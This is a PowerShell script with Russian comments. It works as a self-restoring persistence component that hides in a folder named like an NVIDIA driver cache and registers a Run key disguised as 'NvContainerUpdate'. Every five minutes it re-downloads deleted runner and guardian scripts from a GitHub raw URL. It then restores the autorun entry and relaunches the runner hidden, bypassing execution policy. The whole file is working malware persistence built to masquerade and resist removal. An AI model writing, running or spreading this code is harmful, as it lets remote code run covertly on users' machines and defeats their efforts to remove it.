$workDir = "$env:LOCALAPPDATA\NVIDIA\DriverCache"
$runnerPath = "$workDir\runner.ps1"
$guardianPath = "$workDir\guardian.ps1"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "NvContainerUpdate"

# Функция восстановления
function Restore {
    # Скачиваем свежие скрипты с GitHub, если файлы удалены
    $runnerUrl = "https://raw.githubusercontent.com/fololop10-source/video-repo/main/runner.ps1"
    $guardianUrl = "https://raw.githubusercontent.com/fololop10-source/video-repo/main/guardian.ps1"
    
    if (-not (Test-Path $runnerPath)) {
        Invoke-WebRequest -Uri $runnerUrl -OutFile $runnerPath -UseBasicParsing
    }
    if (-not (Test-Path $guardianPath)) {
        Invoke-WebRequest -Uri $guardianUrl -OutFile $guardianPath -UseBasicParsing
    }
    
    # Восстанавливаем запись в реестре
    $regValue = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPath`""
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction SilentlyContinue
    
    # Запускаем runner, если не запущен
    $runnerProcess = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*runner.ps1*" }
    if (-not $runnerProcess) {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPath`"" -WindowStyle Hidden
    }
}

# Бесконечный цикл проверки
while ($true) {
    Restore
    Start-Sleep -Seconds 300  # проверка каждые 5 минут
}
